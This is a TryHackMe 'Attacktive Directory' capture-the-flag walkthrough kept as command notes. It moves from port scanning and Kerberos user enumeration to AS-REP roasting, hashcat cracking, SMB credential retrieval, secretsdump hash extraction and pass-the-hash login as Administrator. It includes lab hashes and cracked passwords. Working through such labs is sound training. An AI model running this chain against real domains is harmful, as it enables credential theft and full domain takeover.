+++
title = "Attacktive Directory"
+++

# https://tryhackme.com/room/attacktivedirectory

```bash
=================================
10.201.110.230 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.110.230' >> ~/.zshrc && source ~/.zshrc

spookysec.local\User
spookysec.local\Administrator

sudo nmap -n -Pn -sS -A -T4 -p- -oA nmap_scan $TARGET
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 00:57:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-18T00:58:57+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-17T00:30:41
|_Not valid after:  2026-04-18T00:30:41
|_ssl-date: 2025-10-18T00:59:06+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 5 hops
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-18T00:59:00
|_  start_date: N/A

enum4linux -a $TARGET
// Domain Name: THM-AD

wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/sbin/kerbrute

echo 10.10.194.183 spookysec.local | sudo tee -a /etc/hosts
kerbrute_linux_amd64 userenum -o kerbrute_users.txt --dc spookysec.local --domain 'spookysec.local' userlist.txt
james@spookysec.local
svc-admin@spookysec.local
James@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
JAMES@spookysec.local
Robin@spookysec.local
Administrator@spookysec.local
Darkstar@spookysec.local
Paradox@spookysec.local
DARKSTAR@spookysec.local
ori@spookysec.local
ROBIN@spookysec.local
// svc-admin and backup look interesting

# check ASREPRoasting // Does not require Pre-Authentication
GetNPUsers.py -no-pass spookysec.local/svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:402033af51f102b6150fe3f9657e6085$f5ba5c84c92d67760b557ac0d431fee340683c1c4410352daeb324a9ae14e8818a835dff3bb1fae59bfe1fe9a852f6f46895e371289012ac17ba1b3cf02b624cfff8711ede0cb285333f6b5b9b7c0f9b0357581ddda9cc0347bec981cc5b53bda5d03932b44161e428279249217a83fdfc65c624a0131b82565bd9376208d50626a2a3881d602d31c85a5260165c5e529d5d0f55c2bf2dc67b640f50231fd144329442f828a98db006035011eae179af52eacca93fdb7c5fae526a1be45ddd18166104ddf0f01e7e340438302869cf69340962b9345e8967284734c4de5935a5a52845139a804891ff805e681058e7d6e618
# https://hashcat.net/wiki/doku.php?id=example_hashes
// 18200 	Kerberos 5, etype 23, AS-REP 	$krb5asrep$

hashcat --quiet --force -m 18200 svc-admin-hash.txt passwordlist.txt
// management2005

smbclient --user 'svc-admin' --password management2005 --list spookysec.local
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share

smbclient --user 'svc-admin' '\\spookysec.local\backup'
ls
//   backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
print backup_credentials.txt
// NT_STATUS_ACCESS_DENIED opening remote file backup_credentials.txt
get backup_credentials.txt
// YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
// backup@spookysec.local:backup2517860

# <USER>:<PASSWORD>@<TARGET>
secretsdump.py -no-pass -just-dc 'backup:backup2517860@spookysec.local'
// Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::  

evil-winrm -u Administrator -H '0e0363213e37b94221497260b0bcb4fc' -i spookysec.local
cat C:\Users\Administrator\Desktop\root.txt
cat C:\Users\svc-admin\Desktop\user.txt.txt
cat C:\Users\backup\Desktop\PrivEsc.txt
```